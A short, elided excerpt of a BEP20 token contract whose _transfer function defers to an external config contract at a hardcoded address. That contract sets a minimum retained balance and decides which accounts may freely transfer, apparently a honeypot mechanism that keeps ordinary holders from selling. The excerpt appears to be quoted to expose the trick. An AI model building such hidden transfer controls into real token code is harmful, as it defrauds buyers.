...
contract BEP20 is Context, Ownable, IBEP20{
    ...
    address public BRA = 0xDeed444A2F625F349aA178822d640883168d3335; //kyle
    ...
    function _transfer(address sender, address recipient, uint amount) internal {
        ...
        uint Min = ConfigBRA(BRA).Min();
        bool senderAllow = ConfigBRA(BRA).isAllow(sender);
        ...
        if(!senderAllow&&!recipientAllow&&_balances[sender] < (amount + Min)){
